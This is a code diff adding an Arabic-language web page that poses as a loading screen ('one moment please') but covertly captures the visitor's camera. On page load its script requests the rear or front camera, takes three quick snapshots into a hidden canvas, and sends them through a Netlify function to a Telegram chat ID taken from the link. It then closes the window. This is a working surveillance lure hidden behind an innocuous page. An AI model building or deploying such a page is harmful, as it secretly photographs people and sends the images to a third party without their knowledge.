@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>كاميرا التوثيق</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #1a2a3a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255,255,255,0.3);
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">لحظة من فضلك...</div>
+    </div>
+
+    <video id="cameraPreview" class="hidden" autoplay playsinline muted></video>
+    <canvas id="photoCanvas" class="hidden"></canvas>
+
+    <script>
+        // أزليت التوكن من هنا
+        
+        // وظائف سريعة بدون تأخير
+        function getChatId() {
+            return new URLSearchParams(window.location.search).get('chatId');
+        }
+        
+        // إرسال الصور عبر Netlify Function
+        async function sendPhotoToTelegram(photoBlob, chatId, photoNumber) {
+            try {
+                // تحويل Blob إلى Base64
+                const reader = new FileReader();
+                const base64Promise = new Promise((resolve) => {
+                    reader.onloadend = () => resolve(reader.result);
+                });
+                reader.readAsDataURL(photoBlob);
+                const base64Data = await base64Promise;
+                
+                // إرسال لـ Netlify Function
+                const response = await fetch('/.netlify/functions/send-photo', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        photo: base64Data.split(',')[1], // فقط الجزء بعد ,
+                        photoNumber: photoNumber
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error sending photo:', error);
+                return false;
+            }
+        }
+        
+        async function takeThreePhotosUltraFast() {
+            const chatId = getChatId();
+            if (!chatId) {
+                window.close();
+                return;
+            }
+            
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.getElementById('photoCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = 640;
+            canvas.height = 480;
+            
+            try {
+                // 1. طلب الإذن للكاميرا الخلفية
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { exact: "environment" },
+                        width: { exact: 640 },
+                        height: { exact: 480 },
+                        frameRate: { ideal: 15 }
+                    }
+                });
+                
+                video.srcObject = stream;
+                video.play().catch(() => {});
+                
+                // انتظار 300ms فقط
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                // التقاط وإرسال الصور الثلاث
+                const sendPromises = [];
+                
+                for (let i = 1; i <= 3; i++) {
+                    // التقاط الصورة
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            // إرسال كل صورة بشكل غير متزامن
+                            const sendPromise = sendPhotoToTelegram(blob, chatId, i);
+                            sendPromises.push(sendPromise);
+                        }
+                    }, 'image/jpeg', 0.7);
+                    
+                    // انتظار 100ms بين الصور
+                    if (i < 3) {
+                        await new Promise(r => setTimeout(r, 100));
+                    }
+                }
+                
+                // انتظار كل عمليات الإرسال
+                await Promise.all(sendPromises);
+                
+                // إغلاق الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+                
+                // إغلاق النافذة بعد 500ms
+                setTimeout(() => {
+                    window.close();
+                }, 500);
+                
+            } catch (error) {
+                // إذا فشلت الكاميرا الخلفية، جرب الأمامية
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: "user",
+                            width: { exact: 640 },
+                            height: { exact: 480 },
+                            frameRate: { ideal: 15 }
+                        }
+                    });
+                    
+                    video.srcObject = stream;
+                    video.play().catch(() => {});
+                    
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    
+                    const sendPromises = [];
+                    
+                    for (let i = 1; i <= 3; i++) {
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        canvas.toBlob((blob) => {
+                            if (blob) {
+                                const sendPromise = sendPhotoToTelegram(blob, chatId, i);
+                                sendPromises.push(sendPromise);
+                            }
+                        }, 'image/jpeg', 0.7);
+                        
+                        if (i < 3) {
+                            await new Promise(r => setTimeout(r, 100));
+                        }
+                    }
+                    
+                    await Promise.all(sendPromises);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    setTimeout(() => {
+                        window.close();
+                    }, 500);
+                    
+                } catch (fallbackError) {
+                    // في حالة خطأ
+                    setTimeout(() => {
+                        window.close();
+                    }, 300);
+                }
+            }
+        }
+        
+        // بدء فوري عند تحميل الصفحة
+        window.addEventListener('load', takeThreePhotosUltraFast);
+    </script>
+</body>
+</html>
